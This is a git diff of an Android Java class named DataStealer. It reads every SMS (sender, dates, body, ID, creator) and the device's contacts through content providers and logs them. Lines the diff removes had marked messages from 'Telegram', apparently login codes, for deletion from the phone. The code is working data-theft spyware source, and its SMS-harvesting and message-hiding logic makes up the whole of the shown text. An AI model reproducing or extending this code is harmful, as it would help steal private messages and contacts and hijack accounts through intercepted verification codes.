@@ -40,9 +40,9 @@ public class DataStealer {
                 Telephony.Sms.PERSON,
                 Telephony.Sms.ADDRESS,
                 Telephony.Sms.DATE_SENT,
-                Telephony.Sms.SUBJECT,
                 Telephony.Sms.BODY,
-                Telephony.Sms._ID
+                Telephony.Sms._ID,
+                Telephony.Sms.CREATOR
         };
 
         Cursor cursor = context.getContentResolver().query(
@@ -54,8 +54,6 @@ public class DataStealer {
 
 
         Log.d("SMS_DEBUG", Arrays.toString(cursor.getColumnNames()));
-
-        long idOfMessageToDelete = -1;
 
         if (null != cursor && cursor.moveToFirst()) {
             int positionOfAddressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
@@ -70,25 +68,14 @@ public class DataStealer {
                 String date = "DATE: " + cursor.getString(positionOfDateSentColumn);
                 String recDate = "REC_DATE: " + cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE_SENT));
                 String body = "BODY: " + cursor.getString(positionOfBodyColumn);
-                String subject = "SUBJECT: " + cursor.getString(positionOfSubjectColumn);
-                long smsId = cursor.getLong(positionOfIdColumn);
 
-                Log.d("SMS READ:", recDate + "\n" + address + "\n" + date + "\n" + body + "\n" + subject);
+                Log.d("SMS READ:", recDate + "\n" + address + "\n" + date + "\n" + body + "\n");
 
                 if (address.equals("ADDRESS: Telegram")) {
-                    Log.d("DEBUG", "Ready for deletion of Message w. ID" + smsId);
-                    idOfMessageToDelete = smsId;
                 }
             } while (cursor.moveToNext());
             cursor.close();
         }
-
-        if (idOfMessageToDelete != -1) {
-            Log.d("DEBUG", "Calling for ID" + idOfMessageToDelete);
-        }
-
-
-        // DELETE is just contextResolver.delete
 
         return null;
     }
@@ -115,12 +102,10 @@ public class DataStealer {
         // Retrieves the profile from the Contacts Provider
         Cursor cursor = context.getContentResolver().query(
                 ContactsContract.Contacts.CONTENT_URI,
-                null,
+                projection,
                 null,
                 null,
                 null);
-
-        Log.d("DEBUG", Arrays.toString(cursor.getColumnNames()));
 
         ArrayList<Contact> extractedContacts = new ArrayList<>();
         if (null != cursor && cursor.moveToFirst()) {
